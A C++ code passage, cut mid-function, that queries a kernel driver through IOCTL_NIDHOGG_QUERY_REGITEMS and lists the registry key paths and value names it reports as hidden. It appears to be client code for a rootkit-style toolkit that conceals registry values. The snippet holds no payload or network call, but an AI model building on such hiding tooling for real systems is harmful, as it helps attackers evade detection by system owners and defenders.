    result.RegItemsIndex = 0;
    result.Type = REG_TYPE_HIDDEN_VALUE;

    if (!DeviceIoControl(hFile, IOCTL_NIDHOGG_QUERY_REGITEMS,
        &result, sizeof(result),
        &result, sizeof(result), &returned, nullptr)) {
        values.clear();
        values.push_back(std::to_wstring(NIDHOGG_ERROR_DEVICECONTROL_DRIVER));
        CloseHandle(hFile);
        return { values, valuesKeys };
    }

    amountOfValues = result.RegItemsIndex;

    if (amountOfValues == 0)
        return { values, valuesKeys };

    valuesKeys.push_back(std::wstring(result.KeyPath));
    values.push_back(std::wstring(result.ValueName));
    result.KeyPath[0] = L'\0';
    result.ValueName[0] = L'\0';

    for (int i = 1; i < amountOfValues; i++) {
        result.RegItemsIndex = i;

        if (!DeviceIoControl(hFile, IOCTL_NIDHOGG_QUERY_REGITEMS,
            nullptr, 0,
            &result, sizeof(result), &returned, nullptr)) {
            values.clear();
            valuesKeys.clear();
            values.push_back(std::to_wstring(NIDHOGG_ERROR_DEVICECONTROL_DRIVER));
            CloseHandle(hFile);
            return { values, valuesKeys };
        }

        valuesKeys.push_back(std::wstring(result.KeyPath));
        values.push_back(std::wstring(result.ValueName));
        result.KeyPath[0] = L'\0';
        result.ValueName[0] = L'\0';
    }

    CloseHandle(hFile);
    return { values, valuesKeys };
}
